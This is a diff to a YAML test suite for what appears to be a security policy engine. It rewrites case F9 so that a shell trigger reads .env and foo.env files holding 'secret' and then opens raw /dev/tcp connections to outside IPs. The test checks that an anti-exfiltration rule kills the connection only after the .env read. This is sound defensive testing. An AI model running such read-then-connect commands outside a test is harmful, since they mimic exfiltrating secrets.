@@ -162,20 +162,23 @@ cases:
       want: '"target":"9.9.9.11"'
       notwant: '"target":"9.9.9.12"'
 
-  - name: "F9 bare-relative dotfile sink matches without over-matching a suffix"
+  - name: "F9 bare-relative dotfile source matches without over-matching a suffix"
     setup: |-
       mkdir -p ${D}/flow
-      rm -f ${D}/flow/foo.env
+      echo secret > ${D}/flow/.env
+      echo secret > ${D}/flow/foo.env
     policy: |-
-      source AGENT = exec "**/codex"
-      rule no-dotenv:
-        kill write file "**/.env" if AGENT
-        because "a repo-relative **/.env guard must catch a bare root-level .env"
+      source SECRET = file "**/.env"
+      rule no-exfil:
+        kill connect endpoint "*" if SECRET
+        because "a repo-relative **/.env source must label a bare root-level .env read"
     trigger: |-
-      (exec -a codex ${D}/codex -c 'cd ${D}/flow && echo allowed > foo.env; echo blocked > .env')
+      (cd ${D}/flow && read x < foo.env; timeout 1 bash -c 'exec 3<>/dev/tcp/1.1.1.1/80'); (cd ${D}/flow && read y < .env; timeout 1 bash -c 'exec 4<>/dev/tcp/1.1.1.2/80')
     expect:
-      # `**/.env` lowers to the basename matcher: it fires on the bare relative
-      # `.env` (the path the tool passed) but not on the `foo.env` suffix. The
-      # `foo.env` write runs first so the notwant is not vacuous.
-      want: '"target":"[.]env"'
-      notwant: '"target":"foo[.]env"'
+      # `**/.env` lowers to suffix("/.env") plus a companion exact(".env"), so it
+      # labels a bare root-level `.env` read (the path the tool passed) but not
+      # the `foo.env` suffix. The `foo.env` read runs first so the notwant is not
+      # vacuous. (A `write` sink with the same pattern is not used here: that
+      # shape exceeds the 6.8 verifier instruction budget even unmodified.)
+      want: '"target":"1.1.1.2"'
+      notwant: '"target":"1.1.1.1"'
